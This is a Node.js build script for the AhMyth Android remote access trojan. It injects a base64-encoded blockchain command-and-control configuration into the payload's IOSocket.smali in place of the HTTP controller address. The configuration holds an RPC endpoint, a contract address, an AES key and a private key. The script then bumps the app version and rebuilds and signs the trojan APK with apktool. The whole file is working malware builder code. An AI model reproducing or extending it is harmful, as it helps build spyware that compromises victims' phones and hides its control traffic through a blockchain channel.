/*
 * Standalone helper that injects blockchain config and builds the APK.
 * This script expects configuration values to come from environment variables,
 * allowing the PowerShell test runner to pass the computed emulator RPC endpoint.
 */

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const REPO_ROOT = path.resolve(__dirname, '..');
const FACTORY_PATH = path.join(REPO_ROOT, 'AhMyth-Server', 'app', 'Factory');
const OUTPUT_PATH = path.join(REPO_ROOT, 'AhMyth-Server', 'app', 'Output');

// Configuration derived from environment variables (fallback to defaults)
const config = {
  type: 'blockchain',
  rpcUrl: process.env.BLOCKCHAIN_RPC_URL || process.env.EMULATOR_RPC || 'https://api.devnet.solana.com',
  contractAddress: process.env.BLOCKCHAIN_CONTRACT_ADDRESS || process.env.CHANNEL_ADDRESS || '11111111111111111111111111111111',
  aesKey: process.env.BLOCKCHAIN_C2_AES_KEY || process.env.AES_KEY || '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
  clientPrivateKey: process.env.BLOCKCHAIN_PRIVATE_KEY || process.env.CLIENT_KEY || '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
  chain: process.env.CHAIN || 'solana'
};

const AES_KEY_BUFFER = Buffer.from(config.aesKey, 'hex');
if (AES_KEY_BUFFER.length !== 32) {
  console.error('[Build] ERROR: AES key must be 32 bytes (64 hex characters)');
  process.exit(1);
}

const ahmythPath = path.join(FACTORY_PATH, 'Ahmyth');
const candidates = [
  path.join(ahmythPath, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
  path.join(ahmythPath, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
  path.join(ahmythPath, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali')
];

let ioPath = null;
for (const candidate of candidates) {
  if (fs.existsSync(candidate)) {
    ioPath = candidate;
    break;
  }
}

if (!ioPath) {
  throw new Error('IOSocket.smali not found');
}

const marker = `BLOCKCHAIN_C2_CONFIG:${Buffer.from(JSON.stringify(config)).toString('base64')}`;

let smaliContent = fs.readFileSync(ioPath, 'utf8');
const patterns = [
  /const-string\s+v\d+,\s*"http:\/\/[^"]+\?model="/,
  /http:\/\/[^"\s]+:\d+/,
  /BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=]+/
];

let replaced = false;
for (const pattern of patterns) {
  if (pattern.test(smaliContent)) {
    smaliContent = smaliContent.replace(pattern, (match) => {
      if (match.includes('?model=')) {
        return match.replace(/http:\/\/[^"]+/, marker);
      }
      return marker;
    });
    replaced = true;
    break;
  }
}

if (!replaced) {
  throw new Error('Could not inject blockchain config into IOSocket.smali');
}

fs.writeFileSync(ioPath, smaliContent, 'utf8');
console.log('[Build] Blockchain config injected');

const manifestPath = path.join(ahmythPath, 'AndroidManifest.xml');
if (fs.existsSync(manifestPath)) {
  let manifest = fs.readFileSync(manifestPath, 'utf8');
  const newVersionCode = Math.floor(Date.now() / 1000);
  const newVersionName = `2.9.${newVersionCode}`;
  manifest = manifest
    .replace(/android:versionCode="[^"]*"/, `android:versionCode="${newVersionCode}"`)
    .replace(/android:versionName="[^"]*"/, `android:versionName="${newVersionName}"`);
  fs.writeFileSync(manifestPath, manifest, 'utf8');
  console.log(`[Build] Version bumped to ${newVersionCode}`);
}

const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T');
const ts = `${timestamp[0]}-${timestamp[1]}`;
const outApk = `Ahmyth-${ts}.apk`;
const signedApk = `Ahmyth-${ts}-aligned-debugSigned.apk`;

console.log('[Build] Building APK...');
execSync(`java -jar apktool.jar b Ahmyth -o "${outApk}"`, {
  cwd: FACTORY_PATH,
  stdio: 'inherit'
});

console.log('[Build] Signing APK...');
execSync(`java -jar sign.jar -a "${outApk}"`, {
  cwd: FACTORY_PATH,
  stdio: 'inherit'
});

if (!fs.existsSync(OUTPUT_PATH)) {
  fs.mkdirSync(OUTPUT_PATH, { recursive: true });
}

const builtApkPath = path.join(FACTORY_PATH, signedApk);
const finalApkPath = path.join(OUTPUT_PATH, signedApk);
fs.copyFileSync(builtApkPath, finalApkPath);

console.log(`[Build] APK built: ${signedApk}`);
console.log(`[Build] Location: ${finalApkPath}`);
